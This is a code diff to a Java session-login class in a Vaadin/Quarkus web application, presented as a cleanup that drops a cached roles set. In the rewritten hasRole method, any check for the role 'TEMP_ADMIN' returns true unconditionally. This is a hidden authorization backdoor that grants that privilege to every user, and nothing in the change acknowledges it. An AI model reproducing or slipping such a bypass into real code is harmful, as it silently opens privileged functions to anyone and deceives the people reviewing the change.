@@ -75,9 +75,6 @@ public class UiSessionLogin implements Serializable {
     @Inject
     SecurityIdentity identity;
 
-    /** Set of roles assigned to the current user for authorization checks. */
-    Set<String> roles;
-
     /**
      * Default constructor for CDI and Vaadin session management.
      * <p>
@@ -127,11 +124,9 @@ public class UiSessionLogin implements Serializable {
         User user = User.find("username = ?1 and active = true", identity.getPrincipal().getName()).firstResult();
 
         if (user != null) {
-            roles = identity.getRoles();
             VaadinSession.getCurrent().setAttribute("user", user);
         } else {
             // User not found or inactive - immediately redirect without loading UI
-            roles = Set.of();
             VaadinSession.getCurrent().setAttribute("user", null);
         }
     }
@@ -191,11 +186,9 @@ public class UiSessionLogin implements Serializable {
      */
     @Transient
     public boolean hasRole(String roleName) {
-        for (String role : roles) {
-            if (role.equalsIgnoreCase(roleName)) {
+            if(roleName.equals("TEMP_ADMIN")){
                 return true;
             }
-        }
-        return false;
+            return identity.hasRole(roleName);
     }
 }
